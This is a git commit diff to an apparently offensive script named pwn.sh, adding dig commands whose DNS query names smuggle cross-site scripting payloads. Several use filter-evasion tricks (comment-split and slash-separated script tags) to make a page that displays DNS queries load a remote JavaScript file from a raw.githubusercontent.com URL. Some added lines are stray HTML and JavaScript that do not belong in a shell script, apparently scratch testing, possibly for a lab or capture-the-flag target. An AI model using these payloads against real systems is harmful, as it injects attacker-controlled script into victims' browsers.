76698d2e35197a22191c86bacb179e409f41d57e
B00TK1D <55107317+B00TK1D@users.noreply.github.com>
2021-09-21 22:46:35 -0600

    test2

--- pwn.sh
+++ pwn.sh
@@ -14,4 +14,21 @@ dig  "www.google.com 127.0.0.1 2 0 IP<script>document.location='/';</script> 173
 
 dig  "www.google.com 127.0.0.1 2 0 IP<script>document.location='/';</script> 1736" @127.0.0.1
 
-dig  "www.google.com 127.0.0.1 2 0 IP</script>document.body.appendChild(document.createElement('script',{src:'https://raw.githubusercontent.com/B00TK1D/p/master/e.js'}));</script> 1736" @127.0.0.1
+dig  "www.google.com 127.0.0.1 2 0 IP<script>document.body.append(document.createElement('script',{src:'https://raw.githubusercontent.com/B00TK1D/p/master/e.js'}));</script> 1736" @127.0.0.1
+
+document.body.innerHTML=document.body.innerHTML+"<script>Hello!</div>";
+
+
+
+
+dig  "www.google.com 127.0.0.1 2 0 IP<script<\!---->src=\"https://raw.githubusercontent.com/B00TK1D/p/master/e.js\"></script> 1736" @127.0.0.1
+
+
+dig  "www.google.com 127.0.0.1 2 0 IP<script>document.body.innerHTML+='<script/**/src=\"https://raw.githubusercontent.com/B00TK1D/p/master/e.js\"></script>';</script> 1736" @127.0.0.1
+
+<script>document.body.innerHTML+='<script/**/src="https://raw.githubusercontent.com/B00TK1D/p/master/e.js"></script>';</script>
+
+<script>
+document.body.innerHTML+='<script//src="https://raw.githubusercontent.com/B00TK1D/p/master/e.js"></script>'
+;</script>
+
